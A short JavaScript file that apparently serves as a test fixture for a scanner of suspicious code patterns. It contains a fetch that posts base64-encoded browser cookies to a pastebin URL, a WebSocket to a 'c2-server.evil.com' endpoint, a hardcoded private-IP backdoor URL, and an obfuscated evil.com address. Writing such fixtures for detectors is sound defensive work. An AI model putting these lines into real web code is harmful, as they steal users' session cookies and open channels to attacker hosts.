// Comprehensive test file with various suspicious patterns

// Network exfiltration
fetch("https://pastebin.com/steal", {
  method: "POST",
  body: btoa(document.cookie)
});

// WebSocket to suspicious endpoint
const ws = new WebSocket("wss://c2-server.evil.com/data");

// Hardcoded private IP
const internalServer = "http://10.0.1.50:9999/backdoor";

// Base64 decoding
const hiddenUrl = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");